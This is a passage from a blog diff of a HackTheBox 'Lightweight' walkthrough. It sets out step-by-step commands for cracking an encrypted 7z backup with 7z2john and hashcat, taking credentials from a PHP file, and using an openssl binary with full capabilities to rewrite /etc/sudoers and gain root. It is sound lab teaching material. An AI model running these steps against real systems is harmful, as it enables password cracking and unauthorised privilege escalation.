KD0nB9nlA15LSJScucTJZ8xNeXChuCBseIzH5IX3hwMkQnXqJhFi+haTBMOpujA203F2/d9pQRffaZHxm5a9WdrsVIh1RUtpVGpOQ/akuNTn956+9BOLnEO8otdXlDy/awQbJoY7wJBT7Rm9Q9StuiOM2/+T6kp2VSGMPPX+31Q6lkLLjvcOojPnX9rMPB9KN3yjBXFNx6wAAgTMHrg/Vsp0lFyTRz+QEKAUvF3aBjjc/V0Q4XUZ3BfKqlXszFWD9VOwoDdFrrQVyt1Xkpeghr98oqeM/tqsHa+cTU4KLtvE6dFAT+mBHorrZNMgAQ1QMjgI1JixeXRRvEIabAUKuuhy+yBzO20vtlnuPmOh3sgjIhYusiF1vL3ojt9qcVa4mCjTpus4e3vJ4gd6iWAt8KT2GmnPjb0+N+tYjcX9U/W/leRKQGX/USF7XWwZioJpI7t/uAAAAABcGjFABCYDAAAcLAQABIwMBAQVdABAAAAyBCgoBPiBwEwAA</span>
+</pre></div>
+
+
+<p>and then I paste this in my Kali box, I decode it and put the output on <code>backup.7z</code>. This is simply another way to copy a file over, instead of using <code>scp</code> as we did earlier:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/lightweight$</span> <span class="nb">echo</span> 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 <span class="p">|</span> base64 -d &gt; backup.7z
+</pre></div>
+
+
+<p>Once in my box I try to unzip it:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/lightweight$</span> 7z x backup.7z 
+
+<span class="go">7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21</span>
+<span class="go">p7zip Version 16.02 (locale=en_GB.utf8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Xeon(R) E-2186M  CPU @ 2.90GHz (906EA),ASM,AES-NI)</span>
+
+<span class="go">Scanning the drive for archives:</span>
+<span class="go">1 file, 3411 bytes (4 KiB)</span>
+
+<span class="go">Extracting archive: backup.7z</span>
+<span class="go">--</span>
+<span class="go">Path = backup.7z</span>
+<span class="go">Type = 7z</span>
+<span class="go">Physical Size = 3411</span>
+<span class="go">Headers Size = 259</span>
+<span class="go">Method = LZMA2:12k 7zAES</span>
+<span class="go">Solid = +</span>
+<span class="go">Blocks = 1</span>
+
+
+<span class="go">Enter password (will not be echoed):</span>
+<span class="go">ERROR: Data Error in encrypted file. Wrong password? : index.php</span>
+<span class="go">ERROR: Data Error in encrypted file. Wrong password? : info.php</span>
+<span class="go">ERROR: Data Error in encrypted file. Wrong password? : reset.php</span>
+<span class="go">ERROR: Data Error in encrypted file. Wrong password? : status.php</span>
+<span class="go">ERROR: Data Error in encrypted file. Wrong password? : user.php</span>
+
+<span class="go">Sub items Errors: 5</span>
+
+<span class="go">Archives with Errors: 1</span>
+
+<span class="go">Sub items Errors: 5</span>
+</pre></div>
+
+
+<p>but we are prompted for a password. I tried using the <code>ldapuser2</code> password but it did not work. As shown above the errors disclose the content of the zip. If we crack the zip then we can get our ends to these PHP files which may contain useful information to get root access.</p>
+<p>First we need to get the hash of the <code>backup.7z</code> file. We can do that with a perl script part of the <code>John</code> framework:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/lightweight$</span> /usr/share/john/7z2john.pl backup.7z <span class="o">&amp;&amp;</span> <span class="nb">echo</span>
+<span class="gp">backup.7z:$7z$2$19$0$$8$11e96ba400e3926d0000000000000000$1800843918$3152$3140$1ed4a64a2e9a8bc76c59d8160d3bc3bbfd995ce02cf430ea41949ff4d745f6bf3ed238e9f06e98da3446dda53df0abf11902852e4b2a4e32e0b0f12b33af40d351b2140d6266db1a3d66e1c82fa9d516556ec893ba6841f052618ad210593b9975307b98db7e853e3ebfbef6856039647a6ad33a63f5b268fc003c39eba04484beff73264ff8c8fdb8e3bcc94ee0df4feacbba388536663f8feb8b1454890752fba4a7fba484cfd6d1d050aa6233478a2c425566d60630d985d15dae09c7485f92ea271d2087ac837b6f9101465cf4a62b0ee225245871655b1aa16526a2a5d61ab942d1418900fec9da5771da34cb8bf56ec7f05a75cf26a0202a7065b8b020769d244d95e3166fdb9f4557324e090307e91bc7adc7f56f5215ffd1463c7403c5725cbf006b46882439d629a14d4a1e25fafb202a1cfbac837eabf002f7ebfc87f20c67ff847c393a54e5724c29840016fa76be0dfbb73a79fb2ec3f0e9c7b246525acad50d76c3fe31d75004e5bc3e93ce79aab2ddbc91c7ce9666503e3ab8dcaf269d4554baee5276c516d23fabf41610ff4f666ad5cf9dc6dc3bed7e1c0a2767f018ca3cd15a35a1fbefce479b649a5db00263b55c470fcb049327e7aeb849359a74a2444de7a3c025b3a9dbfd597e0cdf642c340982b650d69f2c48b1e6b823b460734f3c6f3c1e3917b6780b0efda60ce5b7d03d55ff1fa0a161b9aa876b7498c8104f28ca6c6c629d6ca47c18e54bb237b62bd813d1cd47fdcd87b9597ddf14aec439185f8b892dedb4bcae949dbab74d72cd45dda311e0f38f219a1887bede5ec6697a8ab9f5cec687e18fd6ef2223015a3d717830f0aff0664e66ed51d185e965b55ce702135eb57f5efca251238f8e66f828c3d28d961dd09f244e735419273700e5ce97b4fa9ee3d5b45f8b81c9d5af1436e70f75dc9657354807bcadcdcf1e4f9432b29d55c21b59de59c933d0d96b0f3b89f871c14691faa63db3bdde5ca78f2c470839d49690d82f5c8334d9a857af449b1cd4c140b1087f41d09fb46baf5f0e7228716f992635e99861621d0e99d9d649ad863d99adab4ba060ef19b18a3dc2c64815401867c852ea17b01a5c551249cef2a234a1d0a91be047e06678a35ebe7256cca9791590bbfc37ee200d173f1c87a585003920ff52fc38f74da83c18284dbf171eda45fb0cba8d3ed09fc9d9e951ff95ae8b3326ec4d2cf6eaaca2890464a424f79718f044b6b7903c0f512744332f615f81e7a965df81f78ae950b98df910660b4c85bbee5b6b9b4eb061868530d1dee292296ac18e0f3081048834129583b2a7fa88573039ec01657642450688464a2e9db9bf9483d105875a30d855fe6c657a81ce5242a2a99887bdc1c786b57916b03a0d3cdddec1a0a8f94e6d9926ebf534a5b28fc4a4e16956941a5eb8718dbca21d9464a4a970b77a5967483f1373c4dc04967b16164d9d9ef6824acfcb63e20913234712b7abbc82f562aea65ef39d2bef6608d887cd5ff67966967a568a3dc21f28ad393d2ab3ca85ff7b87eebd97f80d878e616121bb94020c6fb80f3780c41dba3b4c4c3fceeba9748f4d9a47d3454b491b95bafddefd04afc8b1922e4a87534539d391fb948b59fcc1f5072c0af3c29afbbec26e2dfd7fc6d4e3a19fdb37cd49342bc7ec7526b6594295b341fe6a1a2a5f399eadade6dcb84d87fd3b00a9b79ef6c11cc01f5958a43fbdd2602eb10b4ddaa327ac043ee01c470d3ed2519488e80183043f41968f32283577cb5615de2416fcb9a74b1ce282614f818bc5adef0cb1dd6eb98d74a8d8214ec2a361b246bad656b487e8dce40f4fef808ad818c06ef5a972e2614e51e6b040f491a92ff39d55408cf92ccc0f797f27d8c1f7c5004b5613a660b6f306ba447bb99bbe5a408d00eb2dd4127351097f204e9d277a5eb97330a3d3409c7e097a18639542b1c9efe35eda1b12c1346bc8816a0430f5668a38735567ba09580504de831bb639ab1de7d2afcf2e470cbded2960f3300aca88446ccf0fa27715666e4eb45fe5d6a7a46c414d61e5fbbfd384c53e8bac6805083164332c2bd79d05c4d10436377a35b8402e186efd8959131437840c7b010d7ce74423e08bea80639414dbd0c290ced5bb1adf597b7a76141cc15d3d3054bcc4e9df234be4187725576645e86e0cfb9b7769a8cdefbec5b08d4feda04e8fd437631e181ac89deec9c54105a32776a2cb8f068177aabc375359e5b38ae4eb8cebf0668f5d104a5c5929c890c7d1de0694063943b844cd8f274b6f6bcbe004b3fe54e52905200e5b024a02498a1f767758e910516c7c295a552802e47d699cdd98adea07bd4f53f745342b990067339b9a0a2ab0c6ea2c0210961b96c7c22b2daaa322de7fddc91527d118c45d4a2a08a2c37a85a7b665ab4ba625b983019085b32096c78ed8a760c83fbf6c5811b7b16681b0a61513686d6810c72d0f1c30b792b1948a478ad660a4036fcd5dbfc57b352a22a4ed27daf1f8455aa9d81a5b8b28287fea4342c14bd42cf3159c830d322d166958a6e233ca7b9dd2914fce1f2621f95998e83df69bee22f70ae086f242690631fcd33730bb2e5ad64fa7d0b7b93931957311eeaa9b45382d020e85856e456712da51a9c220226d2a177e758ea6b7631647cc8419d04fb6b5dab40a841ba9d5660a550ac817af679f3c1a266b9c657372988ab38cfb6971695c59b5454fdf7ca1170066b99c06c985fb8564eed4caade040ef9320d5198041a2bfc62b4b21eb080520628ed3c8c8a2ffd8e0073b24c2059815da86f1b682622e714124950ff26ad79bf31897331fc23cd075fb1f4822046273b0898bebc1ba23110d74ed459c0c0f12488f0b51310f59c9dae537cdda5a75d48a4ac544531fba92fd6dbaa018cb3cc69ee4b9859f3fa1e022d4850bfd995afa9d70273789084f5955a30df3cf7de7f45c2601fe1ee0adbc89dbbd1aa23badcdfcc9d95e2bfd6f102c92bd1fb9648f446a98ab16302049f6862a0da1c758d0f0a7763e9ac0cdda94bed47f98103f8e068cd12bc83bb9a2bd2be19593d64a2f1034cdad6fbee498488a5b37efebcfe667393cf91c1a4d00082ea8463d57e691a0fb3b2394090dab00bb00d27b418b0db0171da74b6d314b78d951ec5ec87eff81800a0f41bb5eb01d5d116183667e1762c4a1d19631c05a61e1be0f05e5188da27df1a0d8697119fbe29693d776ce50c7896a3bc52888ebdcec056a4d7e675af2ea8de25f52e0470e053dd6614b3548ad0cd282a76d397b7e2fedc98d975003bd29feebc53ee5b412088599ac203cb8b6be1f3a0414511391b3495d175b3dfda7990753255ff0f13eb86ce97b5c6925aa31868523c325548720179c69e0e8df8407f5e87f263acd024cc5c4f5a75ef7a6fc1a3b650257fca20aa00674f35a07dac72471bbb500152b51dfe1743b797ad61110aa76b9fe69c0a02506ba4a6fc0b4a202efb9d88dfba38e5b5352046022cc17b57bdb40153db6b97e2f344d2c4598c0d021044eeb01423f6f6ade5702e10b63782fedddbaeba1dd9f9725eb3f85584fce2319b24851d7ec3ba2c2774741683b383ec97aadb7c912d655b6e5b147c33bb1856623b8ca08f092c0677d56e1dde99aa31ab30a654c57828536a120b4e4835ca6c7b5a2243bddfb9a00750521c74654a281cb12c806437030cd577907a797dc63a3959d47b68119a32a229899be06b7979c14b2c98e75667b8c5d30f0dfedd9553ba894ad9acda62f7f607bb35c080c3a440108ac0ce45f1873c5873488f2901790b08cb4928932a1c479d89ded5f6ce9f16c297e9dcc33c6b882b26c53b7a4f2b390367e36e384c1eb9805c0471aad4f77496e8f4fd447448dd59536629a645d04956fc30bcc686718e8d4d7cfc9ecbef3745af038de55826d328b7bad4a2eb7a10faf09c0618fd90d1941e8e3274bcd6eb2d8bed430ebfe6e8682b60390d79161f3a349c73de552d40f7421e5c4b4de80feb3998eb4ce6ecaef9bd2768e8be6534cd12ac163e70d3ed23963801c04770610c91f1ffcf4cbdf2a733f51e6fd596c855c0b905822a3838a82ea2d0e51dd442c451d05c6aa1b0099883db543927c0cc4016e27bb1b17fe863ae0c18458edbccdd6b15f0b73c3dc8c672c1bbbd81f290e9bb5291192143945d58757f64eceebd88e467d48b54a25cee7ed75263a4bb5d5597b9b5b75b6c254f81871f18246d2d91f664a0f49c1f67940d792d225272e713259f3135e5c286e081b1e2331f9217de1c0c9109d7a898458be85a4c130ea6e8c0db4dc5dbf77da5045f7da647c66e5af5676bb15221d5152da551a9390fda92e3539fde7afbd04e2e710ef28b5d5e50f2fdac106c9a18ef02414fb466f50f52b6e88e336ffe4fa929d9548630f3d7fb7d50ea590b2e3bdc3a88cf9d7f6b30f07d28ddf28c15c5371eb$4218$</span><span class="m">03</span>
+</pre></div>
+
+
+<p>We can see there is a <code>backup.7z:</code> at the beginning of the file. We need to remote that bit and I also put the whole thing into a file called <code>backup.hash</code></p>
+<p>Then use <code>hashcat</code> to crack the hash, but first I need the hash mode which I can find with this command:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/lightweight$</span> hashcat --example-hashes<span class="p">|</span>grep -i <span class="m">7</span>-zip -B2 -A2
+
+<span class="go">MODE: 11600</span>
+<span class="go">TYPE: 7-Zip</span>
+<span class="go">HASH: $7z$0$14$0$$11$33363437353138333138300000000000$2365089182$16$12$d00321533b483f54a523f624a5f63269</span>
+<span class="go">PASS: hashcat</span>
+</pre></div>
+
+
+<p>Now that we have the mode we can crack it:</p>
+<div class="highlight"><pre><span></span>m4rc0ff@SittingDucks:~/Documents/htbBoxes/lightweight$ hashcat -m 11600 backup.hash /usr/share/wordlists/rockyou.txt --force
+hashcat (v6.0.0) starting...
+
+&lt;SNIP&gt;
+
+Host memory required for this attack: 64 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 1 sec
+
+&lt;SNIP&gt;
+808ad818c06ef5a972e2614e51e6b040f491a92ff39d55408cf92ccc0f797f27d8c1f7c5004b5613a660b6f306ba447bb99bbe5a408d0006c9a18ef02414fb466f50f52b6e88e336ffe4fa929d9548630f3d7fb7d50ea590b2e3bdc3a88cf9d7f6b30f07d28ddf28c15c5371eb$4218$03:delete
+
+&lt;SNIP&gt;
+Started: Tue Jun 23 14:08:06 2020
+Stopped: Tue Jun 23 14:09:35 2020
+</pre></div>
+
+
+<p>As shown above, we can see the hash has been cracked and the password is <code>delete</code>. At this point I was able to extract the files and I found <code>ldapuser1</code> credentials inside the <code>status.php</code> file:</p>
+<div class="highlight"><pre><span></span><span class="x">$username = &#39;ldapuser1&#39;;</span>
+<span class="x">$password = &#39;f3ca9d298a553da117442deeb6fa932d&#39;;</span>
+</pre></div>
+
+
+<p>I switch user with <code>su</code> and I see these files in the <code>ldapuser1</code> home:</p>
+<div class="highlight"><pre><span></span><span class="gp">[ldapuser1@lightweight home]$</span> <span class="nb">cd</span> ldapuser1
+<span class="gp">[ldapuser1@lightweight ~]$</span> ll
+<span class="go">total 1484</span>
+<span class="go">-rw-rw-r--. 1 ldapuser1 ldapuser1   9714 Jun 15  2018 capture.pcap</span>
+<span class="go">-rw-rw-r--. 1 ldapuser1 ldapuser1    646 Jun 15  2018 ldapTLS.php</span>
+<span class="go">-rwxr-xr-x. 1 ldapuser1 ldapuser1 555296 Jun 13  2018 openssl</span>
+<span class="go">-rwxr-xr-x. 1 ldapuser1 ldapuser1 942304 Jun 13  2018 tcpdump</span>
+</pre></div>
+
+
+<p>I found nothing interesting in the pcap and the PHP files. <code>openssl</code> and <code>tcpdump</code> are binaries and it's unusual to find them in a Home directory. If I check the hash of these binary I notice is exactly the same as the original ones:</p>
+<div class="highlight"><pre><span></span><span class="gp">[ldapuser1@lightweight ~]$</span> md5sum /usr/bin/openssl 
+<span class="go">fba9d597671181560afeec189d92348c  /usr/bin/openssl</span>
+<span class="gp">[ldapuser1@lightweight ~]$</span> md5sum openssl 
+<span class="go">fba9d597671181560afeec189d92348c  openssl</span>
+
+<span class="gp">[ldapuser1@lightweight ~]$</span> md5sum /usr/sbin/tcpdump 
+<span class="go">d9e3583b74ec93b4c9c792be985d1b8b  /usr/sbin/tcpdump</span>
+<span class="gp">[ldapuser1@lightweight ~]$</span> md5sum tcpdump 
+<span class="go">d9e3583b74ec93b4c9c792be985d1b8b  tcpdump</span>
+</pre></div>
+
+
+<p>I run <code>LinEnum</code> again and I found two new entries in the capabilities section: </p>
+<div class="highlight"><pre><span></span><span class="go">[+] Files with POSIX capabilities set:                                     </span>
+<span class="go">&lt;SNIP&gt;</span>
+<span class="go">/home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep</span>
+<span class="go">/home/ldapuser1/openssl =ep</span>
+</pre></div>
+
+
+<p><code>openssl</code> shows <code>=ep</code> which basically means it has all the capabilities enabled. Found this out from <a href="https://unix.stackexchange.com/questions/515881/what-does-the-ep-capability-mean">this article</a>. </p>
+<p>This is going to be very useful because we can do things that only <code>root</code> can do using <code>openssl</code>.</p>
+<h4 id="manipulate-the-sudoers-file">Manipulate the sudoers file</h4>
+<ol>
+<li>save a copy of the <code>/etc/sudoers</code> to <code>/tmp/sudoers.backup</code></li>
+<li>add the string <code>"ldapuser1    ALL=(ALL)       ALL"</code> to the copy</li>
+<li>copy the content of <code>/tmp/sudoers.backup</code> to <code>/etc/sudoers</code></li>
+</ol>
+<div class="highlight"><pre><span></span><span class="gp">[ldapuser1@lightweight ~]$</span> ./openssl base64 -in /etc/sudoers <span class="p">|</span>base64 -d &gt; /tmp/sudoers.backup
+<span class="gp">[ldapuser1@lightweight ~]$</span> <span class="nb">echo</span> <span class="s2">&quot;ldapuser1    ALL=(ALL)       ALL&quot;</span> &gt;&gt; /tmp/sudoers.backup 
+<span class="gp">[ldapuser1@lightweight ~]$</span> cat /tmp/sudoers.backup <span class="p">|</span> base64 <span class="p">|</span> ./openssl enc -d -base64 -out /etc/sudoers
+<span class="gp">[ldapuser1@lightweight ~]$</span> sudo su -
+<span class="go">[sudo] password for ldapuser1: </span>
+<span class="go">Last login: Thu Dec  6 14:09:41 GMT 2018 on tty1</span>
+<span class="go">Last failed login: Tue Jun 23 15:20:38 BST 2020 on pts/1</span>
+<span class="go">There was 1 failed login attempt since the last successful login.</span>
+<span class="gp">[root@lightweight ~]#</span> cat root.txt 
+<span class="go">f1****************************fa</span>
+</pre></div>
+
+
+<p>Similarly we could have modified the <code>/etc/passwd</code> and <code>/etc/shadow</code> files.</p>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Lightweight.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Lightweight"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
